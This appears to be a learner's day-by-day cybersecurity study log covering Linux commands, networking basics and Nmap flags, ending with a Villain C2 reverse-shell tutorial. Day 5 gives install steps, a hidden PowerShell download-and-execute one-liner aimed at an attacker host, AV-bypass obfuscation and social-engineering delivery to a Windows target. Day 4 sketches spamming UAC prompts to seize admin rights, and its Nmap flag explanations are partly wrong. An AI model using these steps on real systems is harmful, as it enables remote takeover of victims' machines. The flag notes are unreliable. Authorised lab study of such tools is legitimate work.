# Day 01
Welcome to my Repositiory

# Day 02
How to download **virtual box**.
How to download **kali linux**.

# Day 03
**Command lines:**
clear-clears the terminal screen
cd-home directory(home)
ls-list the files
pwd-shows current directory
mkdir-create a new directory
rm-delete a file`

# Day 04
**IPV4 - IPV 6 DIFF:**
Here's a detailed comparison between IPv4 and IPv6, the two major versions of the Internet Protocol:
=> Key Differences
-> Address Space
- IPv4: Limited to ~4.3 billion addresses.
- IPv6: Vast space to support trillions of devices, solving address exhaustion.
  -> Security
- IPv4: Relies on external protocols like IPSec.
- IPv6: Has built-in IPSec for secure communication.
  -> Configuration
- IPv4: Requires manual setup or DHCP.
- IPv6: Supports auto-configuration and renumbering.
  -> Transmission
- IPv4: Uses broadcasting, which can cause network congestion.
- IPv6: Uses multicast and anycast, improving efficiency.

-> Transition Strategies
- Dual Stack: Devices run both IPv4 and IPv6 simultaneously.
- Tunneling: IPv6 packets are encapsulated in IPv4 for compatibility.
- Translation (NAT64): Converts IPv6 to IPv4 and vice versa.

**UDPS BROTHER OF TCP:**
Imagine sending a message across a river:
- TCP builds a bridge first, checks every step, and ensures the message arrives safely and in order.
- UDP just tosses the message across — fast, but risky. If it lands, great. If not, it doesn’t care.

**DYNAMIC AND STATIC  IP ADDRESS**:
- Static IP: Like a permanent home address — always the same, easy to find.
- Dynamic IP: Like a hotel room — changes every time you check in.

- Static IP: Request from ISP or configure manually in device settings.
- Dynamic IP: Automatically assigned by DHCP server (default for most ISPs).

- Which One Should You Use?
- Choose Static IP if:
  =You're hosting a server or website.
  =You need consistent remote access.
  =You're using VoIP or VPN services.
- Choose Dynamic IP if:
  =You're a regular user browsing the internet.
  =You want better privacy and lower cost.
  =You don’t need fixed access to your device.

**NETWORK:**
 Nodes: Devices like computers, printers, or phones
 Transmission Media: Wired (Ethernet, fiber) or wireless (Wi-Fi, Bluetooth)
 Networking Devices:
- Router: Connects different networks
- Switch: Connects devices within a LAN
- Hub: Broadcasts data to all devices
- Modem: Converts digital to analog signals

**IP ADDRESS:**
- Identification: Each device gets a unique IP to identify it on the network.
- Routing: Routers use IPs to forward data packets to the correct destination.
- Communication: IPs are embedded in every packet to ensure accurate delivery.
- NAT (Network Address Translation): Converts private IPs to public IPs for internet access.
   How to Find Your IP Address?
- Windows: ipconfig in Command Prompt
- Linux: ip a or ifconfig
  

**MAC ID:**
A MAC ID (Media Access Control Identifier) is a unique hardware address assigned to a network interface card (NIC) by the manufacturer. It operates at the Data Link Layer (Layer 2) of the OSI model and is used for local network communication.

PAYLOAD - IS LIKE SHUTTER OF ROCKET:
In computer networking, a payload is the actual data being transmitted in a packet. It excludes headers, metadata, or control information used for routing and delivery.
Cybersecurity
- In malware, the payload is the malicious part that performs harmful actions (e.g., deleting files, encrypting data).
- The rest of the virus may just be for spreading or hiding.


HOW THE DATA IS TAKEN:
-FIRST IT COMPROMISES ALL THE OS(WINDOWS,MAC,KALI LINUX)
-SPAM UAC PRMOPT - CONTINUOUS OR LOOPED PERMISSION NOTICE UNTILL GETTING GRANT FOR ADMINISTRATIVE ACCESS THEN FULL CONTROL IS TAKEN BY THE HACKER. 
WHAT IS CURSOR...
RECONNAISSANCE..
PASSIVE AND ACTIVE INFORMAION GATHERING --NOTES
WAYBACK MACHINE - WEBSITE WHERE YOU CAN SEE THE HISTORY OF THE URL 

**CLOUDFLARE:**
is a global cloud platform that provides security, performance, and reliability services for websites, applications, and networks. It acts as a reverse proxy between users and web servers, offering protection and acceleration


Bn-As-O-oN--script-vv-p-sS-sT:
- -Bn: This doesn't match any standard Linux or networking command. It might be a custom flag used in a script or tool.
- -As: Could possibly stand for "assign" or "asynchronous," but it's not a standard option in common tools.
- -O: Often used to mean "optimize" or "output" in various commands.
- -oN: This is a valid Nmap option that specifies output in normal format.
- --script: A common flag in tools like Nmap to run a specific script.
- -vv: A verbosity flag used in many tools (like Nmap or curl) to increase the amount of output detail.
- -p: Used to specify a port number, especially in Nmap.
- -sS: A TCP SYN scan option in Nmap, used for stealth scanning.
- -sT: A TCP connect scan option in Nmap, used when SYN scan isn’t possible.
So, if this is part of an Nmap command

# Day 05
**Creating Reverse shell for Windows Hacking using Villain FrameWork**

Villain is a high-level Stage 0/1 command-and-control (C2) framework that:
- Handles multiple reverse TCP and HoaxShell-based shells
- Enhances shell functionality with built-in utilities
- Supports session sharing across sibling servers (other Villain instances)
- Offers payload generation, obfuscation, and fileless execution features

**Install Villain on Kali Linux**
Villain is optimized for Kali Linux but can be adapted for other platforms with Python support.
**code snippets:**
git clone https://github.com/t3l3machus/Villain
cd Villain
pip3 install -r requirements.txt
sudo apt install gnome-terminal

**Generate Payload**
Villain supports PowerShell-based payloads
**code snippets:**
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>:<port>/payload.ps1')"

You can use Villain’s built-in payload generator or customize your own:
**code snippets:**
python3 Villain.py -p 443

**Obfuscate Payload (Optional)**:
**Villain includes auto-obfuscation to bypass AV:**
- Encodes PowerShell commands
- Wraps them in try-catch blocks to preserve stderr
- Avoids common shell hang-ups
**Execution on Target (Windows):**
- Use social engineering or exploit delivery to run the obfuscated PowerShell payload on the target.
- Once executed, the shell connects back to your Villain server.
**Legal Disclaimer:**
Using Villain or any reverse shell against systems without explicit permission is illegal. This tool is intended for authorized penetration testing and CTF environments only.
**Villain Framework – Command Reference:**
A categorized list of Villain C2 Framework commands with their uses.
Use this for penetration testing in authorized lab environments only.





